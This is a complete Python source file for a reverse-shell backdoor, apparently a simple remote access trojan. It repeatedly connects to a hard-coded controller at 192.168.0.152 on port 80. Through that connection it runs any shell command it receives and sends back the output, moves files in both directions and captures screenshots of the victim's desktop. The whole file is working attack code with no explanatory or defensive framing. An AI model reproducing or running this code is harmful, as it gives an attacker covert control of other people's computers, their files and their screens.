import os
import socket
import json
import subprocess
import pyautogui
from time import sleep
import textwrap


def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screen.png')
def downloadf(file, soc):
    arq = open(file, 'wb')
    soc.settimeout(4)
    sock = soc.recv(1024)
    while sock:
        arq.write(sock)
        try:
            sock = soc.recv(1024)
        except socket.timeout as erro:
            break
    soc.settimeout(None)
    arq.close()
def uploadf(file, soc):
    f = open(file, 'rb')
    soc.send(f.read())

def data_send(data, soc):
    jsondata = json.dumps(data)
    soc.send(jsondata.encode())
def data_recv(soc):
    data = ''
    while soc and soc.fileno() != -1:
        try:
            received_data = soc.recv(1024).decode().rstrip()
            if not received_data:
                continue
            data += received_data
            return json.loads(data)
        except OSError as e:
            if e.errno == 107:
                continue
            else:
                raise
def shell(soc):
    while True:
        commu = data_recv(soc)
        if commu == 'exit':
            break

        elif commu == 'clear':
            pass

        elif commu [:3] == 'cd ':
            os.chdir(commu[3:])

        elif commu [:6] == 'upload':
            downloadf(commu[7:], soc)

        elif commu [:8] == 'download':
            uploadf(commu[9:], soc)

        elif commu [:5] == 'print':
            screenshot()
            uploadf('screen.png', soc)
            os.remove('screen.png')
        elif commu == 'help':
            pass
        else:
            exe = subprocess.Popen(commu, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            execs = exe.stdout.read() + exe.stderr.read()
            execs = execs.decode()
            data_send(execs, soc)

def main():
        while True:
            connected = None

            while not connected:
                try:
                    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    soc.connect(('192.168.0.152', 80))
                    connected = soc
                except (socket.error, socket.timeout):
                    sleep(2)

            try:
                shell(soc)
            except KeyboardInterrupt:
                pass

if __name__ == "__main__":
    main()